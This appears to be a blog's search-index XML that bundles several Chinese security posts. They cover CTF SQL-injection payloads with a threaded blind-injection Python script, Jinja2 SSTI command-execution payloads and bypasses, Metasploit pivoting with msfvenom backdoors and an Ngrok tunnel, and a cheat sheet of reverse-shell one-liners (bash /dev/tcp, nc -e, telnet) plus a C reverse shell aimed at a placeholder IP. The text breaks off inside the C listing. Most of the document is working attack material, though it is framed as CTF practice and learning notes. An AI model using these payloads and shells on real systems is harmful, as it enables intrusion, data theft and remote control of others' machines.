<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFshow_web</title>
      <link href="/2024/11/25/ctf-shua-ti/ctfshow-web/"/>
      <url>/2024/11/25/ctf-shua-ti/ctfshow-web/</url>
      
        <content type="html"><![CDATA[<h2 id="web7-联合查询注入过滤空格"><a href="#web7-联合查询注入过滤空格" class="headerlink" title="web7:联合查询注入过滤空格"></a>web7:联合查询注入过滤空格</h2><p>将空格换为%09或<code>/**/</code>来绕过</p><p>获取表名payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1/**/union/**/select/**/1,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3/**/from/**/information_schema.tables/**/where/**/table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="flag-page-user"><a href="#flag-page-user" class="headerlink" title="flag,page,user"></a>flag,page,user</h4><p>获取列名payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1/**/union/**/select/**/1,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3/**/from/**/information_schema.columns/**/where/**/table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="flag-id-title-content-id-username-password"><a href="#flag-id-title-content-id-username-password" class="headerlink" title="flag,id,title,content,id,username,password"></a>flag,id,title,content,id,username,password</h4><p>获取flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1/**/union/**/select/**/1,group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>,3/**/from/**/web7.flagctfshow<span class="token punctuation">{</span>e3588acc-a317-455c-8d41-c80827f1588b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web8-过滤union和空格"><a href="#web8-过滤union和空格" class="headerlink" title="web8:过滤union和空格"></a>web8:过滤union和空格</h2><p>于是通过盲注的方法</p><p>写一个布尔盲注脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">'http://bc6797c9-75c5-4ae8-8740-2998be71fadd.challenge.ctf.show/index.php?id=-1/**/or/**/'</span><span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        urls <span class="token operator">=</span> url <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'If'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">return</span> i<span class="token keyword">def</span> <span class="token function">get_correct</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    correct <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            urls <span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/**/for/**/1)))='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'If'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                correct <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>correct<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> correct<span class="token keyword">def</span> <span class="token function">force_database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    database_len_payload <span class="token operator">=</span> <span class="token string">'(select/**/length(database()))='</span>    databse_len <span class="token operator">=</span> get_len<span class="token punctuation">(</span>url<span class="token punctuation">,</span>database_len_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'database_len:</span><span class="token interpolation"><span class="token punctuation">{</span>databse_len<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    database_payload <span class="token operator">=</span> <span class="token string">'(select/**/ascii(substr(database()/**/from/**/'</span>    database <span class="token operator">=</span> get_correct<span class="token punctuation">(</span>url<span class="token punctuation">,</span>databse_len<span class="token punctuation">,</span>database_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'database:</span><span class="token interpolation"><span class="token punctuation">{</span>database<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table_len_payload <span class="token operator">=</span> <span class="token string">'(select/**/length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())))='</span>    table_len <span class="token operator">=</span> get_len<span class="token punctuation">(</span>url<span class="token punctuation">,</span>table_len_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'table_len:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>table_len<span class="token punctuation">)</span><span class="token punctuation">)</span>    table_names_payload <span class="token operator">=</span> <span class="token string">'(select/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/'</span>    table_names <span class="token operator">=</span> get_correct<span class="token punctuation">(</span>url<span class="token punctuation">,</span>table_len<span class="token punctuation">,</span>table_names_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'table_names:'</span><span class="token operator">+</span>table_names<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_column</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    column_names_len_payload <span class="token operator">=</span> <span class="token string">'(select/**/length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)))='</span>    columns_len <span class="token operator">=</span> get_len<span class="token punctuation">(</span>url<span class="token punctuation">,</span>column_names_len_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'columns_len:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>columns_len<span class="token punctuation">)</span><span class="token punctuation">)</span>    column_names_payload <span class="token operator">=</span> <span class="token string">'(select/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/'</span>    column_names <span class="token operator">=</span> get_correct<span class="token punctuation">(</span>url<span class="token punctuation">,</span>columns_len<span class="token punctuation">,</span>column_names_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'column_names:'</span><span class="token operator">+</span>column_names<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag_len_payload <span class="token operator">=</span> <span class="token string">'(select/**/length((select/**/group_concat(flag)/**/from/**/web8.flag)))='</span>    flag_len <span class="token operator">=</span> get_len<span class="token punctuation">(</span>url<span class="token punctuation">,</span>flag_len_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag_len:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag_len<span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_payload <span class="token operator">=</span> <span class="token string">'(select/**/ascii(substr((select/**/group_concat(flag)/**/from/**/web8.flag)/**/from/**/'</span>    flag <span class="token operator">=</span> get_correct<span class="token punctuation">(</span>url<span class="token punctuation">,</span>flag_len<span class="token punctuation">,</span>flag_payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    thread_num <span class="token operator">=</span> <span class="token number">50</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>thread_num<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>force_flag<span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终拿到flag</p><pre class="line-numbers language-none"><code class="language-none">ctfshow{a8576530-bc13-4ea2-8976-d52947a19dbf}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241125235531635.png" alt="image-20241125235531635"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu_SSTI</title>
      <link href="/2024/11/23/ctf-shua-ti/buu-ssti/"/>
      <url>/2024/11/23/ctf-shua-ti/buu-ssti/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-html" data-language="html"><code class="language-html">http://d25e1d74-e7dc-41be-9342-20a070f723fe.node5.buuoj.cn:81/?password={{2*3}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<img src="/2024/11/23/ctf-shua-ti/buu-ssti/image-20241123154505340.png" alt="image-20241123154505340"></p><p>可知，存在jinja2模板注入</p><h3 id="1-方法一，手工"><a href="#1-方法一，手工" class="headerlink" title="1.方法一，手工"></a>1.方法一，手工</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">?password<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看所有可用类,找到os类的索引</span>?password<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看os的所有可用方法，看是否有popen</span>?password<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat app/server.py| grep "FLAG"'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 利用popen执行命令并用read()回显到页面上</span>python<span class="token operator">-</span>SSTI常规套路flag就是在<span class="token operator">/</span>app<span class="token operator">/</span>server<span class="token punctuation">.</span>py文件里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/11/23/ctf-shua-ti/buu-ssti/image-20241123162324682.png" alt="image-20241123162324682"></p><h3 id="方法二，tplmap自动化SSTI工具"><a href="#方法二，tplmap自动化SSTI工具" class="headerlink" title="方法二，tplmap自动化SSTI工具"></a>方法二，tplmap自动化SSTI工具</h3><p>装在kali里了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sstimap.py -u <span class="token string">"http://26d6feae-49dd-47bb-b0af-7965673765c9.node5.buuoj.cn:81/?password="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/11/23/ctf-shua-ti/buu-ssti/image-20241123164613448.png" alt="image-20241123164613448"></p><p>这个工具可以干很多事情。</p><p>–os-shell直接拿到shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sstimap.py -u <span class="token string">"http://26d6feae-49dd-47bb-b0af-7965673765c9.node5.buuoj.cn:81/?password="</span> --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以上传文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sstimap.py -u <span class="token string">"http://26d6feae-49dd-47bb-b0af-7965673765c9.node5.buuoj.cn:81/?password="</span> --download <span class="token number">1</span>.txt app/1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/"/>
      <url>/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>   使用的框架不同，模板引擎的解析符号也不同。</p><p><img src="/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/image-20241123100138998.png" alt="image-20241123100138998"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看所有可用类</span>从上面的可用类中找到os的索引下标，比如是<span class="token number">132</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看os的所有可用方法，看是否有popen</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment"># 利用popen方法进行命令执行，并通过read()方法使执行结果回显到页面上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>##其他引用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">config<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>url_for<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment"># 过滤中括号[]可绕过</span>lipsum<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>get_flashed_messages<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>##若过滤的单引号，则利用传参的方式赋值：</p><p>request.args.x—-&gt; 通过x传参来赋值（参数逃逸）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment">#列表的方式</span>从上面的可用类中找到os的索引下标，比如是132<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment"># 查看os的所有可用方法，看是否有popen</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span>request.args.x<span class="token punctuation">]</span><span class="token punctuation">(</span>request.args.y<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token assign-left variable">x</span><span class="token operator">=</span>popen<span class="token operator">&amp;</span><span class="token assign-left variable">y</span><span class="token operator">=</span>cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">request.args.x   get传参request.values.x   所有参数request.cookies    cookie参数request.headers.x    请求头参数request.form.x      post传参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="过滤下划线绕过"><a href="#过滤下划线绕过" class="headerlink" title="过滤下划线绕过"></a>过滤下划线绕过</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request.values.a<span class="token punctuation">))</span>.os.popen<span class="token punctuation">(</span>request.values.b<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token assign-left variable">a</span><span class="token operator">=</span>__globals__<span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="/2024/11/21/web-an-quan/nei-wang-chuan-tou/"/>
      <url>/2024/11/21/web-an-quan/nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h2 id="1-msf内网穿透"><a href="#1-msf内网穿透" class="headerlink" title="1.msf内网穿透"></a>1.msf内网穿透</h2><p>msf拿到跳板机的shell后拿到flag1，便进入到meterpreter后渗透，进行内网信息收集——查看靶机上的内网路由地址，然后将其添加到本地代理中进行内网穿透。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter<span class="token operator">&gt;</span> run get_local_subnets  <span class="token comment"># 获取网络接口</span>run autoroute -p   <span class="token comment">#查看到跳板机能连接到内网中靶机2的路由地址</span>run autoroute -s <span class="token number">192.168</span>.22.0/24   <span class="token comment">#kali添加能连接靶机2的路由地址</span><span class="token comment">#开启本地代理</span>use auxiliary/server/socks4a<span class="token builtin class-name">set</span> srvport <span class="token number">2222</span>exploit<span class="token comment">#配置proxychains.conf</span><span class="token function">vim</span> /etc/proxychains.conf添加  socks4 <span class="token number">192.168</span>.21.128 <span class="token number">2222</span>然后内网穿透代理就设置好了,下一步就可以直接扫内网中其他主机了proxychains nmap -sT -Pn <span class="token number">192.168</span>.22.0/24 -p <span class="token number">80</span>  <span class="token comment"># 扫描出靶机2</span>漏洞利用之后蚁剑拿到shell,拿到flag2然后上传一个正向代理的后门msfvenom -p linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">3333</span> -f elf <span class="token operator">&gt;</span> t2.elf  <span class="token comment">#生成正向连接的后门</span>然后再继续扫描出靶机2中能连接靶机3的路由地址，并添加到kali上再找靶机3上的漏洞进行利用，拿到靶机3的shell拿到flag3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-Ngrok内网穿透"><a href="#2-Ngrok内网穿透" class="headerlink" title="2.Ngrok内网穿透"></a>2.Ngrok内网穿透</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ngrok隧道目录下./sunny.exe --server<span class="token operator">=</span>free.idcfengye.com:4443 --key<span class="token operator">=</span><span class="token number">213246308639</span>   <span class="token comment">#开启隧道</span>做后门，让靶机反向连接Ngrok服务器msfvenom -p linux/x64/meterpreter_reverse_http <span class="token assign-left variable">lhost</span><span class="token operator">=</span>0x00dream.free.idcfengye.com <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">80</span> -f elf <span class="token operator">&gt;</span> houmen.elfuse exploit/multi/handler<span class="token builtin class-name">set</span> payload linux/x64/meterpreter_reverse_http   或  windows/meterpreter/reverse_http<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.21.128<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/11/21/web-an-quan/fan-dan-shell/"/>
      <url>/2024/11/21/web-an-quan/fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<p>bash -i</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/10.10.10.10/9001 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nc -e</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token number">10.10</span>.10.10 <span class="token number">9001</span> -e <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nc.exe -e</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc.exe <span class="token number">10.10</span>.10.10 <span class="token number">9001</span> -e <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ncat -e</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ncat <span class="token number">10.10</span>.10.10 <span class="token number">9001</span> -e <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ncat.exe -e</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ncat.exe <span class="token number">10.10</span>.10.10 <span class="token number">9001</span> -e <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf windows</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.10.10 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9001</span> -f exe -o reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf linux</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.10.10 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9001</span> -f elf -o reverse.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf 反向 php</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p php/reverse_php <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.10.10 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9001</span> -o shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>telnet</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -u<span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token function">mkfifo</span> <span class="token variable">$TF</span> <span class="token operator">&amp;&amp;</span> telnet <span class="token number">10.10</span>.10.10 <span class="token number">9001</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token variable">$TF</span> <span class="token operator">|</span> <span class="token function">sh</span> <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token variable">$TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>C linux</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;int main(void){    int port = 9001;    struct sockaddr_in revsockaddr;    int sockt = socket(AF_INET, SOCK_STREAM, 0);    revsockaddr.sin_family = AF_INET;           revsockaddr.sin_port = htons(port);    revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.10");    connect(sockt, (struct sockaddr *) &amp;revsockaddr,     sizeof(revsockaddr));    dup2(sockt, 0);    dup2(sockt, 1);    dup2(sockt, 2);    char * const argv[] = {"sh", NULL};    execve("sh", argv, NULL);    return 0;       }<span 